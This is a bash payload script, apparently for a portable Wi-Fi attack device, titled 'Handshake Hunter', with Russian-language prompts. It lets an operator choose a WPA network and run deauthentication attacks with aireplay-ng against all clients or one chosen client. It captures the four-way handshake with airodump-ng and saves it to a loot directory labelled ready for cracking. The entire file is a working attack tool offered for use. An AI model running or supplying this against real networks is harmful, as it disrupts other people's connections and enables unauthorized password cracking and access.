#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
# Title: Handshake Hunter
# Author: bad-antics
# Description: Targeted WPA handshake capture
# Category: nullsec/capture

# Автоопределение беспроводного интерфейса (устанавливает $IFACE).
# В случае отсутствия подключенного адаптера подключается библиотека из альтернативного пути.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/handshakes"
mkdir -p "$LOOT_DIR"

PROMPT "ОХОТНИК ЗА РУКОПОЖАТИЯМИ

Захват WPA рукопожатий
для выбранной сети.

Варианты:
- Ожидание
- Активный деаутентификатор
- По конкретному клиенту

Нажмите OK для настройки."

PROMPT "ВЫБЕРИТЕ ЦЕЛЬ:

1. Сканировать и выбрать
2. Ввести BSSID вручную

Выберите опцию."

MODE=$(NUMBER_PICKER "Режим (1-2):" 1)

if [ "$MODE" -eq 1 ]; then
    SPINNER_START "Сканирование..."
    timeout 10 airodump-ng $IFACE --encrypt wpa --write-interval 1 -w /tmp/hsscan --output-format csv 2>/dev/null
    SPINNER_STOP
    
    NET_COUNT=$(grep -c "WPA" /tmp/hsscan*.csv 2>/dev/null || echo 0)
    PROMPT "Найдено $NET_COUNT WPA сетей"
    
    TARGET_NUM=$(NUMBER_PICKER "Цель № (1-$NET_COUNT):" 1)
    
    TARGET_LINE=$(grep "WPA" /tmp/hsscan*.csv 2>/dev/null | sed -n "${TARGET_NUM}p")
    BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
    CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
    SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')
else
    BSSID=$(MAC_PICKER "BSSID цели:")
    CHANNEL=$(NUMBER_PICKER "Канал:" 6)
    SSID="target"
fi

PROMPT "МЕТОД ЗАХВАТА:

1. Пассивный (ожидание)
2. Деаут всех клиентов
3. По конкретному клиенту

Выберите метод."

METHOD=$(NUMBER_PICKER "Метод (1-3):" 2)

if [ "$METHOD" -eq 3 ]; then
    CLIENT_MAC=$(MAC_PICKER "MAC клиента для деаутентификации:")
fi

DURATION=$(NUMBER_PICKER "Макс. длительность (сек):" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac

CAP_FILE="$LOOT_DIR/hs_${SSID}_$(date +%Y%m%d_%H%M)"

resp=$(CONFIRMATION_DIALOG "НАЧАТЬ ЗАХВАТ?

SSID: $SSID
BSSID: $BSSID
Канал: $CHANNEL
Метод: $METHOD

Нажмите OK, чтобы начать.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Идет охота за рукопожатием..."

# Фиксация канала
iwconfig $IFACE channel $CHANNEL

# Запуск захвата
airodump-ng $IFACE --bssid "$BSSID" -c $CHANNEL -w "$CAP_FILE" &
CAP_PID=$!

sleep 3

# Деаут в зависимости от метода
case $METHOD in
    2) # Деаут всех
        for i in 1 2 3; do
            aireplay-ng -0 5 -a "$BSSID" $IFACE 2>/dev/null
            sleep 10
            
            # Проверка рукопожатия
            if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
                LOG "Рукопожатие захвачено!"
                break
            fi
        done
        ;;
    3) # По клиенту
        for i in 1 2 3; do
            aireplay-ng -0 10 -a "$BSSID" -c "$CLIENT_MAC" $IFACE 2>/dev/null
            sleep 10
            
            if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
                LOG "Рукопожатие захвачено!"
                break
            fi
        done
        ;;
    *) # Пассивный
        sleep $DURATION
        ;;
esac

kill $CAP_PID 2>/dev/null

# Проверка рукопожатия
if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
    PROMPT "УСПЕХ!

Рукопожатие захвачено!

SSID: $SSID
Файл: ${CAP_FILE}.cap

Готово к взлому.
Нажмите OK для выхода."
else
    PROMPT "НЕТ РУКОПОЖАТИЯ

Не удалось захватить
рукопожатие для $SSID

Попробуйте снова с активным
deauth или увеличьте время.

Нажмите OK для выхода."
fi
